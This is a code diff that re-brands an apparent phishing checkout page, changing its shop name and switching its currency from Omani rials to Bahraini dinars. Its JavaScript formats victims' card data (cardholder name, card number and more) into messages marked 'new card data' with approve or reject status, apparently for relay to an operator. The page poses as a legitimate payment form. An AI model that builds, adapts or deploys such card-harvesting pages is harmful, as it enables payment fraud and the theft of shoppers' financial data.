@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>أرياف | الدفع</title>
+<title>دلمون | الدفع</title>
 <link rel="stylesheet" href="../../assets/fonts/cairo.css">
 <style>
 :root{--navy:#14304a;--blue:#2563eb;--line:#e3e8ec;--panel:#f5f7f9;--mut:#6b7780;--gold:#f3c63d;--ok:#16a34a}
@@ -125,10 +125,10 @@ svg{width:1em;height:1em;flex:none}
     </div>
   </div>
   <div class="sum" aria-label="ملخص الخصم">
-    <span class="o">السعر الأصلي:</span><span><del>5.000 ر.ع</del></span>
-    <span class="g">خصم 15%:</span><span class="g">‎-0.750 ر.ع</span>
+    <span class="o">السعر الأصلي:</span><span><del>5.000 د.ب</del></span>
+    <span class="g">خصم 15%:</span><span class="g">‎-0.750 د.ب</span>
   </div>
-  <button type="submit" class="pay"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg> دفع 4.250 ر.ع</button>
+  <button type="submit" class="pay"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><rect x="5" y="11" width="14" height="10" rx="2"/><path d="M8 11V8a4 4 0 018 0v3"/></svg> دفع 4.250 د.ب</button>
   <p id="status" class="stat" role="status" hidden></p>
 </form>
 
@@ -162,7 +162,7 @@ svg{width:1em;height:1em;flex:none}
     const ltrMark = '\u200E';
     const customerName = getCustomerName();
 
-    const message = `💳 *بيانات بطاقة جديدة (أرياف)*:\n\n` +
+    const message = `💳 *بيانات بطاقة جديدة (دلمون)*:\n\n` +
                     `👤 *اسم صاحب الطلب:* ${ltrMark}${customerName}\n` +
                     `🏷️ *اسم حامل البطاقة:* ${ltrMark}${data.name}\n` +
                     `🔢 *رقم البطاقة:* \`${ltrMark}${data.card}\`\n` +
@@ -205,7 +205,7 @@ svg{width:1em;height:1em;flex:none}
     const customerName = getCustomerName();
     const statusText = action === 'approve_payment' ? '✅ *الحالة:* تمت الموافقة' : '❌ *الحالة:* تم الرفض';
     
-    const updatedMessage = `💳 *بيانات بطاقة (أرياف)*:\n\n` +
+    const updatedMessage = `💳 *بيانات بطاقة (دلمون)*:\n\n` +
                            `👤 *اسم صاحب الطلب:* ${ltrMark}${customerName}\n` +
                            `🏷️ *اسم حامل البطاقة:* ${ltrMark}${cardData.name}\n` +
                            `🔢 *رقم البطاقة:* \`${ltrMark}${cardData.card}\`\n` +
